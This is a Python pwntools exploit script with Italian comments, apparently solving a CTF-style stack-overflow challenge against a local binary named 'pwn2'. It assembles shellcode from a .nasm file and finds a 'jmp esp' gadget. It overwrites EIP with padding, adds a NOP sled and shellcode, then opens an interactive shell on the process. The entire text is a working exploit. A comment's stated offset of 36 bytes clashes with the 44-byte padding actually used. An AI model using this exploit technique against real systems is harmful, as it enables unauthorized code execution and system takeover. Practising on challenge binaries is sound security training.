from pwn import *

def get_shellcode(filename):
    with open(filename + ".nasm", "r") as f:
        lines = f.readlines()

    # Rimuove tutto quello che c'è dopo un ';' in ogni riga
    clean_code = ""
    for line in lines:
        clean_code += line.split(';')[0] + "\n"

    # Adesso asm() non vedrà più i commenti problematici
    raw_shellcode = asm(clean_code)
    log.success(f"Shellcode assemblato! ({len(raw_shellcode)} bytes)")
    return raw_shellcode

context.update(arch='i386', os='linux')
elf = ELF('./pwn2')

# Ora carichiamo lo shellcode direttamente dal sorgente .nasm
shellcode = get_shellcode("shellcode")

try:
    # Cerchiamo il gadget nel binario
    jmp_esp = next(elf.search(asm('jmp esp')))
except StopIteration:
    try:
        jmp_esp = next(elf.search(asm('call esp')))
    except StopIteration:
        log.error("Nessun gadget JMP ESP o CALL ESP trovato!")

log.success(f"Indirizzo JMP ESP trovato: {hex(jmp_esp)}")


# 4. Costruisci il payload
# Offset 32 (buffer) + 4 (EBP) = 36 byte
padding = b"A" * 44
eip = p32(jmp_esp)
# Aggiungiamo qualche NOP per sicurezza (NOP Sled)
nop_sled = b"\x90" * 16

payload = padding + eip + nop_sled + shellcode

# 5. Esecuzione
p = process('./pwn2')

p.recvuntil(b"$ ") # Aspetta il prompt del programma
p.sendline(payload)

log.info("Payload inviato! Incrociamo le dita...")
p.interactive()
